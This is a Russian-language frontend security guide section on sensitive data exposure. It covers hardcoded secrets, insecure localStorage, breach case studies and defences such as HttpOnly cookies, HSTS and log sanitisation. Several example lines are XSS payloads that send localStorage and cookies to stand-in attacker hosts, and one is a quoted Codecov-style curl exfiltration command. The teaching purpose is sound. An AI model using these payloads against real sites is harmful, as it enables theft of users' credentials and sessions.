## 3. Sensitive Data Exposure

### Что это такое

Sensitive Data Exposure — это уязвимость, при которой приложение ненадлежащим образом защищает чувствительные данные такие как финансовая информация, credentials, персональные данные (PII), или ключи шифрования. На frontend это часто проявляется через хранение секретов в JavaScript коде, localStorage, или передачу через незашифрованные каналы.

**CVSS Score:** 7.5 - 10.0 (в зависимости от типа данных)
**CWE ID:** CWE-200, CWE-312, CWE-319, CWE-522
**OWASP Top 10:** A02:2021 – Cryptographic Failures

### Как работает механизм атаки

Data Exposure на frontend происходит через несколько векторов:

1. **Hardcoded Secrets:** API ключи, tokens, credentials закоммичены в исходный код
2. **Client-Side Storage:** Чувствительные данные в localStorage/sessionStorage доступны через XSS
3. **Network Exposure:** Данные передаются через HTTP без шифрования или логируются
4. **Source Maps:** Production source maps раскрывают бизнес-логику и секреты
5. **Browser DevTools:** Secrets видны в Network tab, Console logs, или Application storage

### Типы Data Exposure

#### 3.1 Hardcoded Secrets в коде

**Характеристики:**
- Секреты embedded в JavaScript files
- Видны через View Source или DevTools
- Часто попадают в Git history
- Индексируются поисковиками если leaked в public repos

**Примеры:**
```javascript
// ❌ КРИТИЧЕСКАЯ уязвимость
const API_KEY = 'sk_live_51HxKjLKj4r2Kb1234567890';
const AWS_SECRET = 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY';
const DB_PASSWORD = 'super_secret_123';
const STRIPE_SECRET = 'sk_test_4eC39HqLyjWDarjtT1zdp7dc';

// Использование
fetch('https://api.service.com/data', {
    headers: { 'Authorization': `Bearer ${API_KEY}` }
});
```

**Impact:** КРИТИЧЕСКИЙ - полная компрометация системы

#### 3.2 Insecure Client-Side Storage

**localStorage/sessionStorage:**
```javascript
// ❌ Опасно - доступно через XSS
localStorage.setItem('authToken', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...');
localStorage.setItem('apiKey', 'sk_live_abc123');
localStorage.setItem('creditCard', '4532-1234-5678-9010');
localStorage.setItem('ssn', '123-45-6789');

// Атака через XSS:
<script>
    fetch('http://evil.com/steal', {
        method: 'POST',
        body: JSON.stringify({
            storage: localStorage,
            cookies: document.cookie
        })
    });
</script>
```

**Impact:** ВЫСОКИЙ - массовая кража credentials через единичную XSS

#### 3.3 Network Exposure

**HTTP вместо HTTPS:**
```javascript
// ❌ Credentials передаются в plaintext
fetch('http://api.example.com/login', {
    method: 'POST',
    body: JSON.stringify({
        username: 'user@example.com',
        password: 'MyPassword123!'
    })
});

// Man-in-the-Middle может перехватить:
// POST http://api.example.com/login
// {"username":"user@example.com","password":"MyPassword123!"}
```

**Console logging:**
```javascript
// ❌ Секреты в production logs
console.log('User logged in:', {
    username: user.email,
    password: user.password, // НИКОГДА!
    ssn: user.ssn
});

// Видно в DevTools Console
// Может логироваться error monitoring (Sentry, etc.)
```

### Реальные кейсы с финансовым impact

#### Equifax (2017) - $1.4 миллиарда

**Что произошло:**
Неисправленная уязвимость в Apache Struts framework (CVE-2017-5638). Патч был доступен за 2 месяца до атаки, но не был применен.

**Технические детали:**
```java
// Уязвимый код в Struts (Java, но релевантно для понимания)
// Content-Type header не валидировался
// Позволял Remote Code Execution

// Атака:
Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)...}
```

**Результат:**
- 147 миллионов записей скомпрометированы
- Украдены: SSN, даты рождения, адреса, номера водительских удостоверений
- 209,000 кредитных карт
- **$1.4 миллиарда** общая стоимость:
  - $425 млн компенсации потребителям
  - $175 млн штрафы штатам
  - $100+ млн улучшение security
  - Остальное - судебные издержки, PR кризис
- CEO уволен
- Репутация уничтожена

**Root cause:** Неприменение security patch = data exposure через RCE

#### Uber (2016) - $148 миллионов

**Что произошло:**
AWS access keys были закоммичены в публичный GitHub репозиторий разработчиками Uber.

**Механизм:**
```javascript
// В репозитории было что-то вроде:
// config.js (случайно закоммичен без .gitignore)
module.exports = {
    aws: {
        accessKeyId: 'AKIAIOSFODNN7EXAMPLE',
        secretAccessKey: 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
        region: 'us-east-1'
    }
};

// Хакеры:
// 1. Нашли ключи через GitHub search
// 2. Получили доступ к AWS S3 buckets
// 3. Скачали backup базы данных с данными пользователей
```

**Результат:**
- 57 миллионов пользователей скомпрометированы:
  - 25 млн в US
  - 32 млн internationally
- Данные: имена, email, телефоны
- 600,000 водителей: номера лицензий
- **$148 миллионов** урегулирование:
  - $100 млн штрафы от регуляторов
  - $48 млн компенсации штатам
- Uber СКРЫВАЛ breach целый год, заплатив хакерам $100,000
- CEO и CSO ушли в отставку

**Урок:** Один закоммиченный файл с секретами = $148 млн

#### Honda (2020) - Остановка производства

**Что произошло:**
AWS credentials в публичном S3 bucket → Ransomware атака → остановка заводов по всему миру.

**Механизм:**
```
1. AWS credentials случайно опубликованы в S3 bucket с public read
2. Атакующие нашли через автоматизированное сканирование S3
3. Использовали credentials для доступа к внутренней сети
4. Развернули ransomware (вероятно SNAKE/EKANS)
5. Зашифровали критичные системы производства
```

**Результат:**
- Заводы в US, Turkey, India, Brazil остановлены
- Несколько дней простоя
- Миллионы долларов потерянного производства
- Возможная выплата выкупа (не подтверждено)

**Урок:** Data exposure может вести к ransomware и operational shutdown.

#### Codecov (2021) - Supply Chain через Environment Variables

**Что произошло:**
Bash Uploader script Codecov был модифицирован для кражи environment variables, включая секреты тысяч компаний.

**Механизм:**
```bash
# Вредоносный код добавлен в bash uploader:
curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" \
  https://evil-server.com/upload || true

# Воровал:
# - Environment variables (все секреты CI/CD)
# - Git remote URLs
# - Отправлял на сервер злоумышленников
```

**Результат:**
- Затронуто: 1000+ компаний
- Включая: HashiCorp, Twilio, Confluent, Rapid7, Monday.com
- Украдено: AWS keys, GitHub tokens, API secrets
- Некоторые компании полностью ротировали всю инфраструктуру
- Стоимость ротации секретов: миллионы долларов суммарно

**Урок:** Environment variables в CI/CD - это treasure trove для атакующих.

### Технические детали эксплуатации

#### Поиск секретов в Git history

**GitHub/GitLab scanning:**
```bash
# Поиск API keys в публичных репозиториях
# Инструменты автоматизации:

# TruffleHog
trufflehog --regex --entropy=True https://github.com/victim/repo

# GitLeaks
gitleaks detect --source . --verbose

# GitHub Secret Scanning (встроенный)
# Автоматически сканирует все коммиты и алертит
```

**Регулярные выражения для поиска:**
```regex
# AWS Keys
(A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}

# Private SSH Keys
-----BEGIN (RSA|DSA|EC|OPENSSH) PRIVATE KEY-----

# Generic secrets
(api[_-]?key|apikey|secret|token|password)[\"']?\s*[:=]\s*[\"']?[A-Za-z0-9+/]{20,}
```

#### Извлечение данных из localStorage через XSS

**Attack vector:**
```javascript
// Простая XSS payload для кражи всего localStorage
<script>
(function() {
    const data = {
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage),
        cookies: document.cookie,
        url: window.location.href,
        userAgent: navigator.userAgent
    };

    // Отправка на сервер злоумышленника
    fetch('https://attacker.com/collect', {
        method: 'POST',
        body: JSON.stringify(data)
    });

    // Или через Image для обхода CSP
    new Image().src = 'https://attacker.com/collect?data=' +
                      btoa(JSON.stringify(data));
})();
</script>
```

#### Network sniffing для credentials

**Man-in-the-Middle на HTTP:**
```bash
# Используя mitmproxy
mitmproxy --mode transparent

# Или Wireshark для перехвата
# Фильтр: http.request.method == "POST"

# В перехваченном трафике видно:
POST /api/login HTTP/1.1
Host: insecure-site.com
Content-Type: application/json

{"username":"victim@email.com","password":"P@ssw0rd123"}
```

### Методы защиты

#### 1. Никогда не храните секреты в client-side коде

**❌ Неправильно:**
```javascript
const config = {
    apiKey: 'sk_live_abc123',
    stripeKey: 'pk_live_xyz789'
};
```

**✅ Правильно:**
```javascript
// .env file (НЕ коммитится в Git)
API_URL=https://api.example.com
PUBLIC_KEY=pk_live_xyz789  // Только публичные ключи

// .gitignore
.env
.env.local
.env.production
*.key
secrets/

// В коде (Next.js пример)
const apiUrl = process.env.NEXT_PUBLIC_API_URL;

// Секретные ключи ТОЛЬКО на backend
// Frontend получает через secure API
```

#### 2. Используйте HttpOnly Cookies для токенов

**Server-side (Node.js):**
```javascript
// ✅ Правильно - HttpOnly cookie
app.post('/login', async (req, res) => {
    const user = await authenticateUser(req.body);
    const token = generateJWT(user);

    res.cookie('authToken', token, {
        httpOnly: true,      // Недоступен через JavaScript
        secure: true,        // Только HTTPS
        sameSite: 'strict',  // CSRF защита
        maxAge: 3600000      // 1 час
    });

    res.json({ success: true });
});

// Middleware автоматически включает cookie в запросы
```

**Client-side:**
```javascript
// ✅ Client НЕ имеет доступа к токену
fetch('/api/protected', {
    credentials: 'include'  // Браузер автоматически отправит cookie
});

// ❌ localStorage - ИЗБЕГАЙТЕ для токенов
// localStorage.setItem('token', token);  // Доступно через XSS!
```

#### 3. Всегда используйте HTTPS

**Force HTTPS redirect:**
```javascript
// Server-side middleware
app.use((req, res, next) => {
    if (req.header('x-forwarded-proto') !== 'https' &&
        process.env.NODE_ENV === 'production') {
        res.redirect('https://' + req.header('host') + req.url);
    } else {
        next();
    }
});

// HSTS Header
app.use((req, res, next) => {
    res.setHeader(
        'Strict-Transport-Security',
        'max-age=31536000; includeSubDomains; preload'
    );
    next();
});
```

**Certificate pinning (для критичных приложений):**
```javascript
// Public-Key-Pins header (deprecated, но концепция важна)
// Теперь используйте Certificate Transparency
```

#### 4. Санитизация логов

**❌ Опасно:**
```javascript
console.log('Login attempt:', req.body);
// {"username":"user@email.com","password":"Secret123!"}

logger.info('Payment processed', paymentData);
// {cardNumber: "4532123456789010", cvv: "123"}
```

**✅ Безопасно:**
```javascript
// Фильтрация чувствительных полей
function sanitizeLog(obj) {
    const sensitive = ['password', 'token', 'ssn', 'creditCard', 'cvv'];
    const sanitized = {...obj};

    for (const key of Object.keys(sanitized)) {
        if (sensitive.some(s => key.toLowerCase().includes(s))) {
            sanitized[key] = '[REDACTED]';
        }
    }

    return sanitized;
}

console.log('Login attempt:', sanitizeLog(req.body));
// {"username":"user@email.com","password":"[REDACTED]"}

// Маскировка частичных данных
function maskCard(cardNumber) {
    return cardNumber.replace(/(\d{4})\d{8}(\d{4})/, '$1********$2');
}

console.log('Card:', maskCard('4532123456789010'));
// Card: 4532********9010
```

#### 5. Source Maps только для development

**Webpack конфигурация:**
```javascript
// webpack.config.js
module.exports = {
    mode: process.env.NODE_ENV,
    devtool: process.env.NODE_ENV === 'production'
        ? false              // ❌ НЕТ source maps в production
        : 'eval-source-map', // ✅ Только в development
};

// Или используйте private source maps (только для error monitoring)
// devtool: 'hidden-source-map'
// Загружайте maps на Sentry, но не публикуйте
```

#### 6. Content Security Policy для снижения impact

**CSP Headers:**
```javascript
app.use((req, res, next) => {
    res.setHeader('Content-Security-Policy',
        "default-src 'self'; " +
        "script-src 'self' 'nonce-${nonce}'; " +
        "connect-src 'self' https://api.example.com; " +
        "img-src 'self' data: https:; " +
        "style-src 'self' 'unsafe-inline';"
    );
    next();
});
```

#### 7. Environment Variables Best Practices

**Безопасное управление:**
```bash
# .env.example (коммитится - шаблон)
API_URL=
DATABASE_URL=
SECRET_KEY=

# .env (НЕ коммитится - реальные значения)
API_URL=https://api.prod.com
DATABASE_URL=postgresql://user:pass@host:5432/db
SECRET_KEY=actual_secret_key_here

# .gitignore
.env
.env.local
.env.*.local
```

**Валидация наличия:**
```javascript
// config.js
function requireEnv(name) {
    const value = process.env[name];
    if (!value) {
        throw new Error(`Missing required environment variable: ${name}`);
    }
    return value;
}

module.exports = {
    apiUrl: requireEnv('API_URL'),
    secretKey: requireEnv('SECRET_KEY')
};
```

### Как тестировать

#### 1. Поиск секретов в коде

**Automated scanning:**
```bash
# TruffleHog
trufflehog filesystem . --json

# GitLeaks
gitleaks detect --source . --report-format json --report-path leaks.json

# git-secrets
git secrets --scan

# Gitleaks pre-commit hook
gitleaks protect --staged
```

**Manual review:**
```bash
# Поиск потенциальных секретов
grep -r "api[_-]key" src/
grep -r "password.*=" src/
grep -r "secret" src/

# Проверка environment variables в bundle
grep -r "process.env" dist/
```

#### 2. Проверка localStorage

**DevTools Console:**
```javascript
// Посмотреть что хранится
console.table(localStorage);

// Проверить на sensitive data
for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    const value = localStorage.getItem(key);
    console.log(key, ':', value);
}
```

#### 3. Network traffic analysis

**Burp Suite / OWASP ZAP:**
```
1. Настроить proxy в браузере
2. Перехватывать весь HTTP/HTTPS трафик
3. Искать в запросах:
   - Credentials в URL parameters
   - Tokens в headers (должны быть в cookies)
   - Unencrypted connections (HTTP)
```

**Browser DevTools:**
```javascript
// Network tab filter
// Найти POST запросы с credentials
// Проверить Request Headers и Payload
```

#### 4. Source map проверка

```bash
# Проверить наличие source maps в production
curl -I https://yoursite.com/static/js/main.abc123.js

# Если есть:
# SourceMap: main.abc123.js.map
# ❌ ПРОБЛЕМА - удалите из production

# Скачать и проверить
curl https://yoursite.com/static/js/main.abc123.js.map
```

### Контрольный чеклист

**Development:**
- [ ] Никаких API keys / secrets в коде
- [ ] .env файлы в .gitignore
- [ ] Environment variables валидируются при старте
- [ ] Sensitive data НЕ логируется (даже в development)
- [ ] localStorage НЕ используется для токенов/secrets
- [ ] HttpOnly cookies для authentication tokens
- [ ] HTTPS enforced (HSTS header)
- [ ] Source maps отключены в production или private
- [ ] Sensitive fields маскируются в error monitoring

**Security Review:**
- [ ] Git history просканирован на секреты (TruffleHog/GitLeaks)
- [ ] Код review на hardcoded credentials
- [ ] Penetration test включает data exposure scenarios
- [ ] Secrets rotation policy существует
- [ ] Incident response plan для случая утечки ключей

**Infrastructure:**
- [ ] Secrets management система используется (Vault, AWS Secrets Manager)
- [ ] CI/CD environment variables encrypted
- [ ] Production secrets отделены от development
- [ ] Automated scanning в CI/CD pipeline

